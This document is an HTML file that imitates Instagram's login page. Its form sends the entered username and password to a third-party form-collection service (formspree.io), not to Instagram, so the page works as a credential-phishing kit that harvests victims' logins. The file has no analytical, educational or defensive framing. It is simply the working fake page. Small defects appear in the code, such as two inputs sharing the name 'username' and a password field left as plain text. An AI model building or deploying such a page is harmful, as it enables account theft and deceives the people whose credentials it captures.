<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login </title>
  <link rel="stylesheet" href="C:\Users\rahul\Desktop\Inst V2\Insta V2 Style sheet.css">
</head>
<body>
  <div class="container">
    <div class="login-container">
      <div class="login-box">
        <h1 class="logo">Instagram</h1>

        <form action="https://formspree.io/f/mpwzknko" method="post">

          <input type="text" placeholder="Phone number, username, or email" required name="username">
          <input type="text" placeholder="Password" required name="username">
      
          <button type="submit">Log In</button>

          <div class="divider">
            <hr>
            <span>OR</span>
            <hr>
          </div>
          <button type="button" class="fb-login">Log in with Facebook</button>
          <a href="#" class="forgot-password">Forgot password?</a>
        </form>
      </div>
      <div class="signup-box">
        <p>Don't have an account? <a href="#">Sign up</a></p>
      </div>
      <div class="app-download">
        <p>Get the app.</p>
        <div class="buttons">
          <img src="https://drive.google.com/file/d/1Tuf2B-y5B2GjV94L_8EY3NQ2ci6M9SzS/view?usp=drive_link" alt="Google Play">
          <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/Download_on_the_App_Store_Badge.svg" alt="App Store">
        </div>
      </div>
    </div>
  </div>
</body>
</html>
